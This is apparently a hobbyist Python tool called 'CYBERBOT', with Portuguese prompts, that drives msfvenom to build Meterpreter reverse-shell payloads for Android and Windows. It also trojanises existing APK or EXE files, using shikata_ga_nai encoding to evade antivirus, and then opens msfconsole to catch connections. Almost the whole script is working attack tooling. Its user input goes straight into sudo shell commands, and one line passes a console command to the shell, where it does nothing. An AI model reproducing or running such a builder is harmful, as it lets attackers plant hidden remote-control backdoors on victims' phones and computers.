import os
from time import sleep
import subprocess
#####################
#   Marlon Sousa    #
#####################


def printar():
        print('\033[33m=\033[m'*50)
os.system('clear')
os.system('mkdir Actions')

print('\033[36m==================================================================\033[m')
print('  \033[36m                   Created by Marlon Sousa\033[m')
print('  \033[36m                           CYBERBOT\033[m')
print("""\033[31m                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&%&&&&&&&       &&&&&&&(&&&
                &&&&&&&&&&&&   ((  &&&&&&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&&&&& % #  & ( #&.& &&&&&&&
                &&&&%&&&&&&&&&&&&&&&&&&&&&/&&&
                &&&&&&&&&&&&&&&&&&&&&&&%&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&\033[m""")
print('\033[36m==================================================================\033[m')
#Criar PAYLOAD
select = input("\033[32m[1]Criar PAYLOAD\n[2]Infectar existente\n[3]Sair\n>\033[m").upper()
printar()

def msfconsole():
    os.system('sudo msfconsole')
def create():
    tipo = input("\033[32m[1]TCP\n[2]HTTP\n\033[m:").upper()
    printar()
    if tipo == '1' or tipo == 'TCP':
        tipo = 'tcp'
    elif tipo == '2' or tipo == 'HTTP':
        tipo = 'http'
    host = input("\033[33mLHOST: \033[m")
    port = input("\033[33mLPORT: \033[m")
    nome = input("\033[33mNome PAYLOAD:\033[m")
    printar()
    aparelho = input("\033[32m[1]ANDROID\n[2]WINDOWS\n:\033[m").upper()
    if aparelho == '1' or aparelho == 'ANDROID':
        printar()
        os.system(f'sudo msfvenom -p android/meterpreter/reverse_{tipo} LHOST={host} LPORT={port} R > Actions/{nome}.apk')
        os.system("gnome-terminal -e 'bash -c \"sudo msfconsole; exec bash\"'")
    elif aparelho == '2' or aparelho == 'WINDOWS':
        os.system(f'sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_{tipo} LHOST={host} LPORT={port} -e x86/shikata_ga_nai -f exe -o Actions/{nome}.exe')
        os.system("gnome-terminal -e 'bash -c \"sudo msfconsole; exec bash\"'")
def infectar():
    aparelho = input("\033[32m[1]ANDROID\n[2]WINDOWS\n\033[m:").upper()
    printar()
    tipo = input('\033[32m[1]TCP\n[2]HTTP\n:\033[m')
    if tipo == '1' or tipo == 'TCP':
        tipo = 'tcp'
    elif tipo == '2' or tipo == 'HTTP':
        tipo = 'http'
    printar()
    if aparelho == '1' or aparelho == 'ANDROID':
        host = input("\033[33mLHOST:\033[m")
        port = input("\033[33mLPORT:\033[m")
        nome = input("\033[33mNome do APK:\033[m")
        nome_novo = input("\033[33mNome Novo:\033[m")
        printar()
        os.system(f'sudo msfvenom -x {nome}.apk -p android/meterpreter/reverse_{tipo} LHOST={host} LPORT={port} R > Actions/{nome_novo}.apk')
        os.system("gnome-terminal -e 'bash -c \"sudo msfconsole; exec bash\"'")
        os.system('use exploit/multi/handler')
    elif aparelho == '2' or aparelho == 'WINDOWS':
        host = input("\033[33mLHOST:\033[m")
        port = input("\033[33mLPORT:\033[m")
        nome = input("\033[33mNome do exe:\033[m")
        nome_novo = input("\033[33mNome Novo:\033[m")
        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_{tipo} -f exe -e x86/shikata_ga_nai -i 25 -k -x {nome}.exe LHOST={host} LPORT={port} > Actions/{nome_novo}.exe")
        os.system("gnome-terminal -e 'bash -c \"sudo msfconsole; exec bash\"'")

if select == '1' or select == 'CRIAR':
    create()
elif select == '2' or select == 'INFECTAR':
    infectar()
elif select == '3' or select == 'SAIR':
    print('Saindo...')
    sleep(1)
    quit()
